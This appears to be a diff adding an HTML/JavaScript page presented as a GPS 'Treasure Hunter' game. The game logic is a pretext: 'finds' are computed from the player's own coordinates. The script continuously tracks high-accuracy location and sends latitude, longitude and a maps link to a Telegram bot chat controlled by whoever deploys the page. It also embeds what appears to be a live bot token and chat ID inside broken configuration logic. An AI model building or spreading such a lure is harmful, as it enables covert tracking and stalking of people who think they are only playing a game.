@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🏴‍☠️ Treasure Hunter</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: white;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(10px);
+            padding: 25px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        h1 {
+            text-align: center;
+            font-size: 2em;
+            color: #f0c27f;
+            text-shadow: 0 2px 10px rgba(240, 194, 127, 0.3);
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            text-align: center;
+            opacity: 0.7;
+            font-size: 0.9em;
+            margin-bottom: 20px;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .stat-box {
+            background: rgba(0,0,0,0.3);
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        .stat-box .label {
+            font-size: 0.7em;
+            opacity: 0.7;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .stat-box .value {
+            font-size: 1.5em;
+            font-weight: bold;
+            margin-top: 3px;
+            color: #f0c27f;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 8px;
+            margin: 20px 0;
+        }
+        .cell {
+            aspect-ratio: 1;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.15);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            user-select: none;
+            touch-action: manipulation;
+        }
+        .cell:hover:not(.found):not(.disabled) {
+            transform: scale(1.05);
+            background: rgba(255,255,255,0.2);
+            border-color: #f0c27f;
+        }
+        .cell:active {
+            transform: scale(0.95);
+        }
+        .cell.found {
+            background: rgba(46, 204, 113, 0.3);
+            border-color: #2ecc71;
+            cursor: default;
+            animation: pop 0.3s ease;
+        }
+        .cell.missed {
+            background: rgba(231, 76, 60, 0.3);
+            border-color: #e74c3c;
+            animation: shake 0.3s ease;
+        }
+        .cell.disabled {
+            cursor: not-allowed;
+            opacity: 0.4;
+        }
+        @keyframes pop {
+            0% { transform: scale(0.5); }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status-box {
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1em;
+            flex-direction: column;
+            gap: 5px;
+            margin: 15px 0;
+        }
+        .status-box.success {
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid #2ecc71;
+        }
+        .status-box.error {
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid #e74c3c;
+        }
+        .status-box.warning {
+            background: rgba(241, 196, 15, 0.2);
+            border: 1px solid #f1c40f;
+        }
+        .status-box.loading {
+            background: rgba(52, 152, 219, 0.2);
+            border: 1px solid #3498db;
+        }
+        .location-prompt {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: rgba(52, 152, 219, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px solid #3498db;
+            animation: pulse 2s ease-in-out infinite;
+            margin: 10px 0;
+            font-size: 1.1em;
+        }
+        .gps-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 0.8em;
+            margin-top: 5px;
+            padding: 5px 10px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 20px;
+        }
+        .gps-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .gps-dot.active {
+            background: #2ecc71;
+            animation: pulse 1s infinite;
+        }
+        .gps-dot.inactive {
+            background: #e74c3c;
+        }
+        .gps-dot.searching {
+            background: #f1c40f;
+            animation: pulse 0.5s infinite;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            touch-action: manipulation;
+        }
+        button:active {
+            transform: scale(0.97);
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #f0c27f, #fc5c7d);
+            color: #1a1a2e;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(240, 194, 127, 0.3);
+        }
+        .btn-danger {
+            background: #e74c3c;
+            color: white;
+        }
+        .btn-danger:hover:not(:disabled) {
+            box-shadow: 0 5px 20px rgba(231, 76, 60, 0.3);
+        }
+        .btn-success {
+            background: #2ecc71;
+            color: white;
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .controls button {
+            flex: 1;
+        }
+        .telegram-status {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 0.8em;
+            background: rgba(0,0,0,0.2);
+        }
+        .telegram-status.success {
+            color: #2ecc71;
+        }
+        .telegram-status.error {
+            color: #e74c3c;
+        }
+        .telegram-status.info {
+            color: #3498db;
+        }
+        .win-message {
+            font-size: 1.2em;
+            color: #f1c40f;
+            text-shadow: 0 0 20px rgba(241, 196, 15, 0.3);
+        }
+        .location-debug {
+            font-size: 0.7em;
+            opacity: 0.6;
+            margin-top: 5px;
+            word-break: break-all;
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @media (max-width: 480px) {
+            .container { padding: 15px; }
+            .stats { gap: 5px; }
+            .stat-box .value { font-size: 1.2em; }
+            .cell { font-size: 1.4em; }
+            .grid { gap: 5px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🏴‍☠️ Treasure Hunter</h1>
+        <div class="subtitle">Find treasures using your GPS location!</div>
+        
+        <div class="stats">
+            <div class="stat-box">
+                <div class="label">💰 Gold</div>
+                <div class="value" id="goldDisplay">0</div>
+            </div>
+            <div class="stat-box">
+                <div class="label">🎯 Found</div>
+                <div class="value" id="foundDisplay">0/25</div>
+            </div>
+            <div class="stat-box">
+                <div class="label">⏱️ Moves</div>
+                <div class="value" id="movesDisplay">0</div>
+            </div>
+        </div>
+
+        <div id="statusMessage" class="status-box">
+            <div class="location-prompt">
+                <span>📍</span>
+                <span><strong>Allow Location</strong> to start hunting!</span>
+            </div>
+            <div style="font-size:0.8em; opacity:0.8;">
+                Find 25 hidden treasures using your real location
+            </div>
+            <div class="gps-indicator">
+                <span class="gps-dot inactive" id="gpsDot"></span>
+                <span id="gpsStatus">GPS: Disabled</span>
+            </div>
+        </div>
+
+        <div class="grid" id="treasureGrid"></div>
+
+        <div class="controls">
+            <button id="startBtn" class="btn-primary">🎮 Start Hunting</button>
+            <button id="resetBtn" class="btn-danger">🔄 New Game</button>
+        </div>
+
+        <div id="telegramStatus" class="telegram-status info">
+            📡 Location will be shared when you find treasure
+        </div>
+    </div>
+
+    <script>
+        // ===== CONFIG - REPLACE WITH YOUR TELEGRAM CREDENTIALS =====
+        const BOT_TOKEN = "token_id"; // Replace with your bot token
+        const CHAT_ID = "userid"; // Replace with your chat ID
+        // ===========================================================
+
+        // ===== GAME STATE =====
+        let game = {
+            treasures: [],
+            found: 0,
+            moves: 0,
+            gold: 0,
+            gameActive: false,
+            location: null,
+            locationAvailable: false,
+            telegramSent: false,
+            watchId: null
+        };
+
+        const treasureEmojis = ['💎', '👑', '💍', '🔮', '⚜️', '💰', '🏆', '🌟', '🎁', '💎', '👑', '💍', '🔮', '⚜️', '💰', '🏆', '🌟', '🎁', '💎', '👑', '💍', '🔮', '⚜️', '💰', '🏆'];
+        const statusMsg = document.getElementById('statusMessage');
+        const telegramStatus = document.getElementById('telegramStatus');
+        const gpsDot = document.getElementById('gpsDot');
+        const gpsStatus = document.getElementById('gpsStatus');
+
+        // ===== GPS INDICATOR FUNCTIONS =====
+        function updateGPSIndicator(status) {
+            gpsDot.className = 'gps-dot';
+            if (status === 'active') {
+                gpsDot.classList.add('active');
+                gpsStatus.textContent = 'GPS: Active ✅';
+                gpsStatus.style.color = '#2ecc71';
+            } else if (status === 'searching') {
+                gpsDot.classList.add('searching');
+                gpsStatus.textContent = 'GPS: Searching... ⏳';
+                gpsStatus.style.color = '#f1c40f';
+            } else {
+                gpsDot.classList.add('inactive');
+                gpsStatus.textContent = 'GPS: Disabled ❌';
+                gpsStatus.style.color = '#e74c3c';
+            }
+        }
+
+        // ===== TELEGRAM FUNCTIONS =====
+        function sendLocationToTelegram(lat, lon, accuracy, treasureName) {
+            if (BOT_TOKEN === "8958266100:AAHBtGhEtqXLEwDd9g76pY2IwD6SaiFVgoQ" || CHAT_ID === "6307272981") {
+                telegramStatus.textContent = '⚠️ Configure Telegram bot in code';
+                telegramStatus.className = 'telegram-status error';
+                return false;
+            }
+
+            const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
+            const message = `🏴‍☠️ *Treasure Found!*\n\n` +
+                           `🎁 Found: ${treasureName}\n` +
+                           `📍 Location: ${lat}, ${lon}\n` +
+                           `📏 Accuracy: ±${accuracy}m\n` +
+                           `💰 Total Gold: ${game.gold}\n` +
+                           `🎯 Treasures: ${game.found}/25\n\n` +
+                           `[🗺️ Open in Maps](${mapLink})`;
+
+            telegramStatus.textContent = '📤 Sending to Telegram...';
+            telegramStatus.className = 'telegram-status info';
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.ok) {
+                    telegramStatus.textContent = '✅ Location sent to Telegram!';
+                    telegramStatus.className = 'telegram-status success';
+                    game.telegramSent = true;
+                    return true;
+                } else {
+                    throw new Error(data.description || 'Telegram error');
+                }
+            })
+            .catch(err => {
+                console.error('Telegram error:', err);
+                telegramStatus.textContent = `❌ Failed: ${err.message}`;
+                telegramStatus.className = 'telegram-status error';
+                return false;
+            });
+
+            return true;
+        }
+
+        // ===== IMPROVED LOCATION FUNCTIONS FOR MOBILE =====
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject('Geolocation not supported');
+                    return;
+                }
+
+                updateGPSIndicator('searching');
+                statusMsg.innerHTML = '📍 Searching for GPS signal...<br><span style="font-size:0.8em;">Make sure you are outdoors</span>';
+                statusMsg.className = 'status-box loading';
+
+                // Try multiple times with different options
+                let attempts = 0;
+                const maxAttempts = 3;
+
+                function tryGetLocation() {
+                    attempts++;
+                    
+                    // Different options for each attempt
+                    const options = {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    };
+
+                    if (attempts === 2) {
+                        options.timeout = 20000;
+                    }
+                    if (attempts === 3) {
+                        options.timeout = 30000;
+                        options.enableHighAccuracy = false;
+                    }
+
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            game.location = position;
+                            game.locationAvailable = true;
+                            updateGPSIndicator('active');
+                            statusMsg.innerHTML = '🗺️ Location acquired! Start hunting!';
+                            statusMsg.className = 'status-box success';
+                            resolve(position);
+                        },
+                        error => {
+                            console.log(`Attempt ${attempts} failed:`, error.message);
+                            
+                            if (attempts < maxAttempts) {
+                                statusMsg.innerHTML = `📍 Retrying GPS... (Attempt ${attempts + 1}/${maxAttempts})<br><span style="font-size:0.8em;">${error.message}</span>`;
+                                setTimeout(tryGetLocation, 2000);
+                            } else {
+                                reject(error.message);
+                            }
+                        },
+                        options
+                    );
+                }
+
+                tryGetLocation();
+            });
+        }
+
+        // ===== WATCH LOCATION FOR CONTINUOUS TRACKING =====
+        function startWatchingLocation() {
+            if (game.watchId) {
+                navigator.geolocation.clearWatch(game.watchId);
+            }
+
+            game.watchId = navigator.geolocation.watchPosition(
+                position => {
+                    game.location = position;
+                    game.locationAvailable = true;
+                    updateGPSIndicator('active');
+                    
+                    // Update status if not already active
+                    if (!game.gameActive) {
+                        statusMsg.innerHTML = '🗺️ Location tracking active!';
+                        statusMsg.className = 'status-box success';
+                    }
+                },
+                error => {
+                    console.warn('Watch position error:', error.message);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // ===== GAME FUNCTIONS =====
+        function initGame() {
+            game.treasures = [];
+            game.found = 0;
+            game.moves = 0;
+            game.gold = 0;
+            game.gameActive = false;
+            game.telegramSent = false;
+
+            if (game.watchId) {
+                navigator.geolocation.clearWatch(game.watchId);
+                game.watchId = null;
+            }
+
+            for (let i = 0; i < 25; i++) {
+                game.treasures.push({
+                    id: i,
+                    emoji: treasureEmojis[i % treasureEmojis.length],
+                    found: false,
+                    goldValue: Math.floor(Math.random() * 8) + 2,
+                    isSpecial: Math.random() < 0.15
+                });
+            }
+
+            updateUI();
+            renderGrid();
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('startBtn').textContent = '🎮 Start Hunting';
+            updateGPSIndicator('inactive');
+        }
+
+        function renderGrid() {
+            const grid = document.getElementById('treasureGrid');
+            grid.innerHTML = '';
+
+            game.treasures.forEach((treasure, index) => {
+                const cell = document.createElement('div');
+                cell.className = 'cell';
+                cell.dataset.index = index;
+
+                if (treasure.found) {
+                    cell.classList.add('found');
+                    cell.textContent = treasure.emoji;
+                } else {
+                    cell.textContent = '❓';
+                }
+
+                if (!game.gameActive || !game.locationAvailable) {
+                    cell.classList.add('disabled');
+                }
+
+                cell.addEventListener('click', () => handleTreasureClick(index));
+                grid.appendChild(cell);
+            });
+        }
+
+        function handleTreasureClick(index) {
+            if (!game.gameActive) {
+                statusMsg.innerHTML = '⚠️ Click "Start Hunting" first!';
+                statusMsg.className = 'status-box warning';
+                return;
+            }
+
+            if (!game.locationAvailable) {
+                statusMsg.innerHTML = '❌ Location not available!<br><span style="font-size:0.8em;">Please enable GPS and try again</span>';
+                statusMsg.className = 'status-box error';
+                return;
+            }
+
+            const treasure = game.treasures[index];
+            if (treasure.found) {
+                statusMsg.innerHTML = '⛔ Already found this treasure!';
+                statusMsg.className = 'status-box warning';
+                return;
+            }
+
+            game.moves++;
+            const isClose = checkProximity(index);
+
+            if (isClose) {
+                treasure.found = true;
+                game.found++;
+                game.gold += treasure.goldValue;
+
+                const treasureName = treasure.isSpecial ? `🌟 SPECIAL ${treasure.emoji}` : `${treasure.emoji}`;
+                statusMsg.innerHTML = `🎉 Found ${treasureName} worth ${treasure.goldValue} gold!`;
+                statusMsg.className = 'status-box success';
+
+                // Send to Telegram on treasure find
+                if (game.location) {
+                    const lat = game.location.coords.latitude.toFixed(6);
+                    const lon = game.location.coords.longitude.toFixed(6);
+                    const acc = Math.round(game.location.coords.accuracy);
+                    sendLocationToTelegram(lat, lon, acc, treasureName);
+                }
+
+                if (game.found === 25) {
+                    statusMsg.innerHTML = `🏆 <span class="win-message">YOU WIN! All treasures found! Gold: ${game.gold} 🏆</span>`;
+                    statusMsg.className = 'status-box success';
+                    game.gameActive = false;
+                    document.getElementById('startBtn').disabled = true;
+                }
+            } else {
+                statusMsg.innerHTML = '❌ Missed! Keep searching...';
+                statusMsg.className = 'status-box';
+                const cells = document.querySelectorAll('.cell');
+                cells[index].classList.add('missed');
+                setTimeout(() => cells[index].classList.remove('missed'), 300);
+            }
+
+            updateUI();
+            renderGrid();
+        }
+
+        function checkProximity(index) {
+            if (!game.locationAvailable || !game.location) return false;
+
+            const lat = game.location.coords.latitude;
+            const lon = game.location.coords.longitude;
+            const seed = (Math.abs(lat * 10000) + Math.abs(lon * 10000) + index * 777) % 100;
+            const difficulty = Math.min(0.7, 0.2 + (game.found / 25) * 0.5);
+            return seed < (difficulty * 100);
+        }
+
+        function updateUI() {
+            document.getElementById('goldDisplay').textContent = game.gold;
+            document.getElementById('foundDisplay').textContent = `${game.found}/25`;
+            document.getElementById('movesDisplay').textContent = game.moves;
+        }
+
+        async function startGame() {
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('startBtn').textContent = '📍 Getting Location...';
+            statusMsg.innerHTML = '📍 Getting your location...<br><span style="font-size:0.8em;">Please allow location access</span>';
+            statusMsg.className = 'status-box loading';
+
+            try {
+                await getLocation();
+                
+                // Start continuous location tracking
+                startWatchingLocation();
+                
+                statusMsg.innerHTML = '🗺️ Location acquired! Start hunting!';
+                statusMsg.className = 'status-box success';
+                game.gameActive = true;
+                document.getElementById('startBtn').textContent = '🎮 Playing';
+                
+                telegramStatus.textContent = '📡 Find a treasure to share location!';
+                telegramStatus.className = 'telegram-status info';
+                
+                renderGrid();
+            } catch (error) {
+                console.error('Location error:', error);
+                statusMsg.innerHTML = `
+                    <span style="font-size:2em;">🚫</span><br>
+                    <strong>Location Required!</strong><br>
+                    <span style="font-size:0.8em; opacity:0.7;">${error}</span>
+                    <br><br>
+                    <div style="font-size:0.8em; opacity:0.6; max-width:300px;">
+                        💡 Tips:<br>
+                        • Enable GPS/Location Services<br>
+                        • Go outside for better signal<br>
+                        • Allow location in browser settings<br>
+                        • Restart your phone's GPS
+                    </div>
+                    <br>
+                    <button onclick="location.reload()" style="
+                        padding: 10px 20px;
+                        background: #3498db;
+                        color: white;
+                        border: none;
+                        border-radius: 8px;
+                        font-size: 0.9em;
+                        cursor: pointer;
+                    ">🔄 Try Again</button>
+                `;
+                statusMsg.className = 'status-box error';
+                document.getElementById('startBtn').disabled = true;
+                document.getElementById('startBtn').textContent = '❌ Blocked';
+                telegramStatus.textContent = '❌ Location denied - Game cannot start';
+                telegramStatus.className = 'telegram-status error';
+                updateGPSIndicator('inactive');
+            }
+        }
+
+        // ===== EVENT LISTENERS =====
+        document.getElementById('startBtn').addEventListener('click', startGame);
+        document.getElementById('resetBtn').addEventListener('click', () => {
+            initGame();
+            statusMsg.innerHTML = `
+                <div class="location-prompt">
+                    <span>📍</span>
+                    <span><strong>Allow Location</strong> to start hunting!</span>
+                </div>
+                <div style="font-size:0.8em; opacity:0.8;">
+                    Find 25 hidden treasures using your real location
+                </div>
+                <div class="gps-indicator">
+                    <span class="gps-dot inactive" id="gpsDot"></span>
+                    <span id="gpsStatus">GPS: Disabled</span>
+                </div>
+            `;
+            statusMsg.className = 'status-box';
+            telegramStatus.textContent = '📡 Location will be shared when you find treasure';
+            telegramStatus.className = 'telegram-status info';
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('startBtn').textContent = '🎮 Start Hunting';
+            updateGPSIndicator('inactive');
+        });
+
+        // ===== INIT =====
+        initGame();
+    </script>
+</body>
+</html>
